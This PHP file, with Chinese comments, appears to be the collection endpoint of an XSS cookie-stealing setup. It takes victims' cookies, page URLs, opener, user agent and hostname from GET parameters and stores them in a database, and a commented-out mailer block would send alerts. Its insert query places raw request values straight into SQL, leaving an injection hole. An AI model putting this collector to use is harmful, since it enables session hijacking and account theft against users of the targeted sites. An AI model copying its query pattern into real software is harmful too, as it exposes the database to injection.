<?php
/**
 * cookie写入数据库
 *
 */
require 'config.php';
$mysqli= mysql_con();
//post
$href=$_GET['href'];
$tophref=$_GET['tophref'];
$cookie=$_GET['cookie'];
$opener=$_GET['opener'];
$userAgent=$_GET['userAgent'];
$hostname=$_GET['hostname'];
$time=time();

$sql="insert into tu_message (cookie, href, tophref, opener, userAgent, create_time,hostname) VALUES ('{$cookie}', '{$href}', '{$tophref}', '{$opener}', '{$userAgent}', '{$time}', '{$hostname}') ";
$mysqli->query($sql);
$mysqli->close();

//require 'mailer/class.phpmailer.php';
//$mail = new PHPMailer();
//$mail->CharSet = "UTF-8";
//$mail->IsSMTP();
//$mail->AddAddress("", "");
//$mail->Host = "";
//$mail->SMTPAuth = true;
//$mail->Username = "";
//$mail->Password = "";
//$mail->Port = 25;
//$mail->From = ""; //邮件发送者email地址
//$mail->FromName = "";   //发件人名称
//$mail->Subject = "";
//$mail->Body = date('Y-m-d H:i:s',time())."包裹收寄验视制度第一条 为维护寄递渠道安全，不予收寄。";
//$mail->Send();
